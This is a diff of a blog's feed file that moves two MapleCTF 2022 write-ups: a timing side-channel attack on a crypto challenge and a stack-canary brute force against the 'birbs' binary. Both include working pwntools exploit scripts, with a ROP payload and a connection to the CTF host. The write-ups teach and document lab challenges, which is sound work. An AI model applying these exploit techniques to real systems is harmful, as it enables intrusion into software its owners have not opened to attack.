@@ -2324,7 +2324,7 @@ https://www.bsfdvbsbilibili.com
   <entry>
     <title>Breaking PrairieLearn Java Grader</title>
     <url>/articles/ctf/breaking-prairielearn-java-grader/</url>
-    <content><![CDATA[<h1 id="PrairieLearn-Java-Autograder-Vulnerability"><a href="#PrairieLearn-Java-Autograder-Vulnerability" class="headerlink" title="PrairieLearn Java Autograder Vulnerability"></a>PrairieLearn Java Autograder Vulnerability</h1><p>Aynakeya <a href="mailto:&#x61;&#121;&#x6e;&#x61;&#x6b;&#101;&#121;&#x61;&#x2e;&#111;&#102;&#102;&#x69;&#x63;&#105;&#97;&#108;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#x61;&#121;&#x6e;&#x61;&#x6b;&#101;&#121;&#x61;&#x2e;&#111;&#102;&#102;&#x69;&#x63;&#105;&#97;&#108;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a></p>
+    <content><![CDATA[<h1 id="PrairieLearn-Java-Autograder-Vulnerability"><a href="#PrairieLearn-Java-Autograder-Vulnerability" class="headerlink" title="PrairieLearn Java Autograder Vulnerability"></a>PrairieLearn Java Autograder Vulnerability</h1><p>Aynakeya <a href="mailto:&#x61;&#x79;&#x6e;&#x61;&#x6b;&#x65;&#x79;&#97;&#46;&#x6f;&#102;&#102;&#105;&#x63;&#105;&#97;&#108;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x61;&#x79;&#x6e;&#x61;&#x6b;&#x65;&#x79;&#97;&#46;&#x6f;&#102;&#102;&#105;&#x63;&#105;&#97;&#108;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a></p>
 <h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>This is a walkthrough of one vulnerability I found in PrairieLearn Java autograder. </p>
 <p>The default Java autograder exists vulnerabilities that allow user to leak information and write files to the container.</p>
 <p>These vulnerabilities allow the user to modify the result of autograder score and get 100% without writing any actual code.</p>
@@ -2730,6 +2730,85 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>[Crypto] &#39;bit by bit&#39; - an example of timing attack [MapleCTF2022]</title>
+    <url>/articles/ctf/maplectf2022-crypto-timing-attack/</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>), there is a crypto question using <strong>timing attack</strong>, which is a type of <strong>side channel attack</strong>.</p>
+<p>timing attack basically is a side channel attack which attacker could attack a crypto system by analyzing the execution time of certain code. </p>
+<p>Since every logical operation require time, more complex code takes more time. We can use this property to analyze codes.</p>
+<p>For example. the second part takes longer than first part</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rip, 1</span><br><span class="line"></span><br><span class="line">add rip, 1</span><br><span class="line">add rip, 1</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h1 id="0x1-Server-Code"><a href="#0x1-Server-Code" class="headerlink" title="0x1 Server Code"></a>0x1 Server Code</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line">from os import urandom</span><br><span class="line">import scrypt</span><br><span class="line"></span><br><span class="line">flag = b&quot;fakeflag&quot;</span><br><span class="line"></span><br><span class="line"># Convert the flag (in bytes) to bits</span><br><span class="line">bits = &#x27;&#x27;.join([bin(c)[2:].zfill(8) for c in flag])</span><br><span class="line">print(bits)</span><br><span class="line"># Return an encrypted string based on the bit at a certain index</span><br><span class="line">def encrypt(index):</span><br><span class="line">	assert(0 &lt;= index &lt; len(bits))</span><br><span class="line"></span><br><span class="line">	# Generate a random salt for the given index</span><br><span class="line">	salt = urandom(32)</span><br><span class="line">	# Depending on the bit value, hash the flag differently</span><br><span class="line">	if bits[index] == &#x27;0&#x27;:</span><br><span class="line">		encrypted = scrypt.hash(flag, salt, 2 ** 16).hex()</span><br><span class="line">	else:</span><br><span class="line">		encrypted = sha256(flag + salt).hexdigest()</span><br><span class="line">	return encrypted[:32]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			print(&quot;Which bit would you like to query for?&quot;)</span><br><span class="line">			bit_index = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">			print(encrypt(bit_index))</span><br><span class="line">		except Exception:</span><br><span class="line">			print(&quot;Something unexpected happened, please try again!&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-Analysis"><a href="#0x2-Analysis" class="headerlink" title="0x2 Analysis"></a>0x2 Analysis</h1><p>firstly, lets take look at how code works.</p>
+<ul>
+<li>pad each character in the 8 bit string</li>
+<li>get the bit given an index, encrypt flag using either sha256 or scrypt depending on the bit</li>
+<li>return the first 32 value of encrypted flag</li>
+</ul>
+<p>looks like we don&#39;t have any possible way of getting the flag. </p>
+<p>However, since <code>scrypt</code> runs much slower than <code>sha256</code>, we can measure the time of encrypting flag. And then use time to figure out if the bit is 1 or 0.</p>
+<p>if we measure the time, we can see scrypt is using 0.16705632209777832 seconds, while sha256 only using 0.0001506805419921875, which is 1000 times slower.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line">0 0.16705632209777832 128</span><br><span class="line">69adfaef506c83899a98cc3f670a0e5d</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">1 0.0001506805419921875 64</span><br><span class="line">3dc8c8cfae15c453bc162cafecc27575</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-exploit-py"><a href="#0x3-exploit-py" class="headerlink" title="0x3 exploit.py"></a>0x3 exploit.py</h1><p>here is my solution</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bits_time = []</span><br><span class="line">io = connect(host, port)</span><br><span class="line">index = 0</span><br><span class="line">while True:</span><br><span class="line">    print(index)</span><br><span class="line">    io.sendlineafter(b&quot;&gt;&gt;&gt; &quot;, b&quot;%d&quot;%index)</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    h = io.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    bits_time.append(t2-t1)</span><br><span class="line">    if h.startswith(b&quot;Something unexpected happened&quot;):</span><br><span class="line">        break</span><br><span class="line">    index +=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(bits_time)</span><br><span class="line">real_bits = []</span><br><span class="line">for bt in bits_time:</span><br><span class="line">    if bt &gt;= 0.1:</span><br><span class="line">        real_bits.append(&quot;0&quot;)</span><br><span class="line">    else:</span><br><span class="line">        real_bits.append(&quot;1&quot;)</span><br><span class="line">print(real_bits)</span><br><span class="line"></span><br><span class="line">for i in range(0,len(real_bits),8):</span><br><span class="line">    print(chr(int(&quot;&quot;.join(real_bits[i:i+8]),2)),end=&quot;&quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-flag"><a href="#0x4-flag" class="headerlink" title="0x4 flag"></a>0x4 flag</h1><p>maple{s!d3_ch@nn3l_a77@ck5}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>crypto</tag>
+        <tag>side channel attack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[pwn] what is canary and how to bruteforce it [MapleCTF2022]</title>
+    <url>/articles/ctf/maplectf2022-pwn-bruteforcing-canary/</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>). There is a quesiton require bruteforcing canary</p>
+<p>To be honest, this is the first time I got practice on brute-forcing canary.</p>
+<h1 id="0x1-What-is-Canary"><a href="#0x1-What-is-Canary" class="headerlink" title="0x1 What is Canary"></a>0x1 What is Canary</h1><p>so, before talking about brute force canary. What is <strong>canary</strong></p>
+<p>Basically, canary is a mitigation that prevent buffer overflow. Since buffer over utilize the overflow the variable on the stack to overwrite rbp and rip. This could help attacker to execute arbitrary code by constructing a rop chain or something. The canary can help prevent simple buffer overflow by put a cookie just above the RBP.</p>
+<span id="more"></span>
+
+<p>Lets take look at what should stack looks like after canary is enbled. </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSP     - </span><br><span class="line">        - local variables.......</span><br><span class="line">        - ....</span><br><span class="line">        -</span><br><span class="line">RBP-8   - Canary is here !!!!</span><br><span class="line"></span><br><span class="line">RBP     - some rbp address</span><br><span class="line">RIP     - some rip address</span><br></pre></td></tr></table></figure>
+<p>We can see canary place a cookie just above RBP, so if an attacker overwrites the stack, for example - overwrite rip, canary is also overwrited.</p>
+<p>Before return to rip, bianry will check if canary is same as before, if canary is different, it means there is a buffer overflow happening. </p>
+<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_025619.jpg" alt="2022-01-30_025619.jpg"></p>
+<h1 id="0x2-How-to-bypass-canary"><a href="#0x2-How-to-bypass-canary" class="headerlink" title="0x2 How to bypass canary"></a>0x2 How to bypass canary</h1><p>so, if canary is open, how can we bypass it.</p>
+<p>First method is just find way to overwrite rip without overwrite the canary. For example, use <code>printf</code>. Or use some bug in the system that may allow you to write data to RIP.</p>
+<p>Second method is brute force the canary.</p>
+<h1 id="0x3-Lets-brute-force-a-canary"><a href="#0x3-Lets-brute-force-a-canary" class="headerlink" title="0x3 Lets brute force a canary"></a>0x3 Lets brute force a canary</h1><p>Lets use birbs as an example.</p>
+<p>in the <code>find_exit()</code>, it first fork the program, than runs <code>guess_exit()</code></p>
+<p><code>fork()</code> is very important here. If the program use fork, the canary in the subroutine will always be the same. Which means the canary of which <code>guess_exit()</code> will always be the same.</p>
+<p>This give us a chance of brute focre the canary of <code>guess_exit</code> and overwrite the data</p>
+<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031511.jpg" alt="2022-01-30_031511.jpg"></p>
+<p>The <code>guess_exit</code> also provide us an opportunity to overwrite the whole stack.</p>
+<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031808.jpg" alt="2022-01-30_031808.jpg"></p>
+<p>The opinion of brute force canary is very simple. Since a canary is 8 byte. We just test one byte by byte. </p>
+<p>If the program crash, it means it is not the correct byte, if program not crash, we save the byte and move to next byte. Until all 8 byte of canary leak.</p>
+<h1 id="0x4-exploits"><a href="#0x4-exploits" class="headerlink" title="0x4 exploits"></a>0x4 exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;birbs&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;birbs.ctf.maplebacon.org&quot;</span><br><span class="line">    port = 32021</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Partial RELRO</span><br><span class="line">#    Stack:    Canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = [b&#x27;&#x27; for i in range(8)]</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    for b in range(256):</span><br><span class="line">        bb = b.to_bytes(0x1,&quot;little&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">        # 0x30 -0x8 = 0x28</span><br><span class="line">        stack = flat(&#123;</span><br><span class="line">            0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">            0x28: canary[:i:],</span><br><span class="line">            0x28+i: bb</span><br><span class="line">        &#125;)</span><br><span class="line">        lp(&quot;guessing canary #%d bytes with byte %x: &quot; % (i,b),stack)</span><br><span class="line">        io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line">        result = io.recvuntil(b&quot;\n&quot;)</span><br><span class="line">        # canary bytes found</span><br><span class="line">        if result.startswith(b&quot;That wasn&#x27;t the exit.&quot;):</span><br><span class="line">            lp(&quot;canary #%d bytes found %x: &quot; % (i,b))</span><br><span class="line">            canary[i] = bb</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">log_print(&quot;canary leak&quot;, canary)</span><br><span class="line">cave_exit_addr = exe.sym[&quot;cave_exit&quot;]</span><br><span class="line">log_print(&quot;cave_exit addr&quot;, hex(cave_exit_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">stack = flat(&#123;</span><br><span class="line">        0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">        0x28: canary,</span><br><span class="line">        0x30: b&#x27;A&#x27;*8,</span><br><span class="line">        0x30+0x8: [</span><br><span class="line">            ret_addr,</span><br><span class="line">            cave_exit_addr</span><br><span class="line">        ]</span><br><span class="line">    &#125;)</span><br><span class="line">log_print(&quot;sending payload&quot;,stack)</span><br><span class="line">io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>maple{f0110W_T4E_B1rB5_T0_TH3_3x1T_562asddw126}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>canary bruteforcing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]</title>
     <url>/articles/ctf/how-to-utilize-printf-in-pwn/</url>
     <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p><strong>printf</strong> is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if I wrote my experience about printf so that I could reinforce my understanding about printf stuff.</p>
@@ -2870,85 +2949,6 @@ https://www.bsfdvbsbilibili.com
         <tag>pwn</tag>
         <tag>ctf</tag>
         <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[Crypto] &#39;bit by bit&#39; - an example of timing attack [MapleCTF2022]</title>
-    <url>/articles/ctf/maplectf2022-crypto-timing-attack/</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>), there is a crypto question using <strong>timing attack</strong>, which is a type of <strong>side channel attack</strong>.</p>
-<p>timing attack basically is a side channel attack which attacker could attack a crypto system by analyzing the execution time of certain code. </p>
-<p>Since every logical operation require time, more complex code takes more time. We can use this property to analyze codes.</p>
-<p>For example. the second part takes longer than first part</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rip, 1</span><br><span class="line"></span><br><span class="line">add rip, 1</span><br><span class="line">add rip, 1</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h1 id="0x1-Server-Code"><a href="#0x1-Server-Code" class="headerlink" title="0x1 Server Code"></a>0x1 Server Code</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line">from os import urandom</span><br><span class="line">import scrypt</span><br><span class="line"></span><br><span class="line">flag = b&quot;fakeflag&quot;</span><br><span class="line"></span><br><span class="line"># Convert the flag (in bytes) to bits</span><br><span class="line">bits = &#x27;&#x27;.join([bin(c)[2:].zfill(8) for c in flag])</span><br><span class="line">print(bits)</span><br><span class="line"># Return an encrypted string based on the bit at a certain index</span><br><span class="line">def encrypt(index):</span><br><span class="line">	assert(0 &lt;= index &lt; len(bits))</span><br><span class="line"></span><br><span class="line">	# Generate a random salt for the given index</span><br><span class="line">	salt = urandom(32)</span><br><span class="line">	# Depending on the bit value, hash the flag differently</span><br><span class="line">	if bits[index] == &#x27;0&#x27;:</span><br><span class="line">		encrypted = scrypt.hash(flag, salt, 2 ** 16).hex()</span><br><span class="line">	else:</span><br><span class="line">		encrypted = sha256(flag + salt).hexdigest()</span><br><span class="line">	return encrypted[:32]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			print(&quot;Which bit would you like to query for?&quot;)</span><br><span class="line">			bit_index = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">			print(encrypt(bit_index))</span><br><span class="line">		except Exception:</span><br><span class="line">			print(&quot;Something unexpected happened, please try again!&quot;)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x2-Analysis"><a href="#0x2-Analysis" class="headerlink" title="0x2 Analysis"></a>0x2 Analysis</h1><p>firstly, lets take look at how code works.</p>
-<ul>
-<li>pad each character in the 8 bit string</li>
-<li>get the bit given an index, encrypt flag using either sha256 or scrypt depending on the bit</li>
-<li>return the first 32 value of encrypted flag</li>
-</ul>
-<p>looks like we don&#39;t have any possible way of getting the flag. </p>
-<p>However, since <code>scrypt</code> runs much slower than <code>sha256</code>, we can measure the time of encrypting flag. And then use time to figure out if the bit is 1 or 0.</p>
-<p>if we measure the time, we can see scrypt is using 0.16705632209777832 seconds, while sha256 only using 0.0001506805419921875, which is 1000 times slower.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line">0 0.16705632209777832 128</span><br><span class="line">69adfaef506c83899a98cc3f670a0e5d</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">1 0.0001506805419921875 64</span><br><span class="line">3dc8c8cfae15c453bc162cafecc27575</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-exploit-py"><a href="#0x3-exploit-py" class="headerlink" title="0x3 exploit.py"></a>0x3 exploit.py</h1><p>here is my solution</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bits_time = []</span><br><span class="line">io = connect(host, port)</span><br><span class="line">index = 0</span><br><span class="line">while True:</span><br><span class="line">    print(index)</span><br><span class="line">    io.sendlineafter(b&quot;&gt;&gt;&gt; &quot;, b&quot;%d&quot;%index)</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    h = io.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    bits_time.append(t2-t1)</span><br><span class="line">    if h.startswith(b&quot;Something unexpected happened&quot;):</span><br><span class="line">        break</span><br><span class="line">    index +=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(bits_time)</span><br><span class="line">real_bits = []</span><br><span class="line">for bt in bits_time:</span><br><span class="line">    if bt &gt;= 0.1:</span><br><span class="line">        real_bits.append(&quot;0&quot;)</span><br><span class="line">    else:</span><br><span class="line">        real_bits.append(&quot;1&quot;)</span><br><span class="line">print(real_bits)</span><br><span class="line"></span><br><span class="line">for i in range(0,len(real_bits),8):</span><br><span class="line">    print(chr(int(&quot;&quot;.join(real_bits[i:i+8]),2)),end=&quot;&quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x4-flag"><a href="#0x4-flag" class="headerlink" title="0x4 flag"></a>0x4 flag</h1><p>maple{s!d3_ch@nn3l_a77@ck5}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>crypto</tag>
-        <tag>side channel attack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[pwn] what is canary and how to bruteforce it [MapleCTF2022]</title>
-    <url>/articles/ctf/maplectf2022-pwn-bruteforcing-canary/</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>). There is a quesiton require bruteforcing canary</p>
-<p>To be honest, this is the first time I got practice on brute-forcing canary.</p>
-<h1 id="0x1-What-is-Canary"><a href="#0x1-What-is-Canary" class="headerlink" title="0x1 What is Canary"></a>0x1 What is Canary</h1><p>so, before talking about brute force canary. What is <strong>canary</strong></p>
-<p>Basically, canary is a mitigation that prevent buffer overflow. Since buffer over utilize the overflow the variable on the stack to overwrite rbp and rip. This could help attacker to execute arbitrary code by constructing a rop chain or something. The canary can help prevent simple buffer overflow by put a cookie just above the RBP.</p>
-<span id="more"></span>
-
-<p>Lets take look at what should stack looks like after canary is enbled. </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSP     - </span><br><span class="line">        - local variables.......</span><br><span class="line">        - ....</span><br><span class="line">        -</span><br><span class="line">RBP-8   - Canary is here !!!!</span><br><span class="line"></span><br><span class="line">RBP     - some rbp address</span><br><span class="line">RIP     - some rip address</span><br></pre></td></tr></table></figure>
-<p>We can see canary place a cookie just above RBP, so if an attacker overwrites the stack, for example - overwrite rip, canary is also overwrited.</p>
-<p>Before return to rip, bianry will check if canary is same as before, if canary is different, it means there is a buffer overflow happening. </p>
-<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_025619.jpg" alt="2022-01-30_025619.jpg"></p>
-<h1 id="0x2-How-to-bypass-canary"><a href="#0x2-How-to-bypass-canary" class="headerlink" title="0x2 How to bypass canary"></a>0x2 How to bypass canary</h1><p>so, if canary is open, how can we bypass it.</p>
-<p>First method is just find way to overwrite rip without overwrite the canary. For example, use <code>printf</code>. Or use some bug in the system that may allow you to write data to RIP.</p>
-<p>Second method is brute force the canary.</p>
-<h1 id="0x3-Lets-brute-force-a-canary"><a href="#0x3-Lets-brute-force-a-canary" class="headerlink" title="0x3 Lets brute force a canary"></a>0x3 Lets brute force a canary</h1><p>Lets use birbs as an example.</p>
-<p>in the <code>find_exit()</code>, it first fork the program, than runs <code>guess_exit()</code></p>
-<p><code>fork()</code> is very important here. If the program use fork, the canary in the subroutine will always be the same. Which means the canary of which <code>guess_exit()</code> will always be the same.</p>
-<p>This give us a chance of brute focre the canary of <code>guess_exit</code> and overwrite the data</p>
-<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031511.jpg" alt="2022-01-30_031511.jpg"></p>
-<p>The <code>guess_exit</code> also provide us an opportunity to overwrite the whole stack.</p>
-<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031808.jpg" alt="2022-01-30_031808.jpg"></p>
-<p>The opinion of brute force canary is very simple. Since a canary is 8 byte. We just test one byte by byte. </p>
-<p>If the program crash, it means it is not the correct byte, if program not crash, we save the byte and move to next byte. Until all 8 byte of canary leak.</p>
-<h1 id="0x4-exploits"><a href="#0x4-exploits" class="headerlink" title="0x4 exploits"></a>0x4 exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;birbs&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;birbs.ctf.maplebacon.org&quot;</span><br><span class="line">    port = 32021</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Partial RELRO</span><br><span class="line">#    Stack:    Canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE 